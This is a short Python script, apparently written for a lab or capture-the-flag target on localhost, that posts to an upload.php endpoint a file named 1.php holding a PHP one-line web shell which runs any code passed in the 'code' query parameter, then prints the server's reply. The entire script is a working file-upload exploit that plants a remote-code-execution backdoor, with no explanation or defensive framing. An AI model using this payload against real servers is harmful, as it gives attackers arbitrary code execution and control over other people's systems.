import requests
web_url ='http://127.0.0.1:8072/upload.php'
data={'filename':'1.php','filecontent':'<?php @eval($_GET["code"])?>'}
ss = requests.session()
result = ss.post(web_url,data=data)
print(data)
content = result.content.decode('utf-8')
print(content)